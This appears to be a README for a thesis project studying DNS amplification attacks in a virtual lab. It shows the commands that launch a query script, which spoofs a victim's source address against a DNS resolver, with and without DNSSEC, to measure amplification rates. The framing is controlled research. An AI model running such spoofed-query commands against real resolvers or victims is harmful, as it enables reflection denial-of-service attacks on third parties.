# Development and Study of a DNS Amplification Attack in a Virtual Environment

The aim of this project was to implement the scripts on this Github repository in order to study the DNS Amplification attack in a controlled virtual environment. You will find various scripts within this project:

## DNS Query Script for Amplification Rate Calculation: sendQuery.py

To launch this script, simply run the following command from the folder containing the entire project on the attacking machine.

Without DNSSEC:
```bash
sudo python3.9 attack/sendQuery.py -s <victimAddress> -d 192.168.68.53 -q amaury.thesis.io -t 60
```
With DNSSEC:
```bash
sudo python3.9 attack/sendQuery.py -s <victimAddress> -d 192.168.68.53 -q amaury.thesis.io -t 60 --dnssec
```
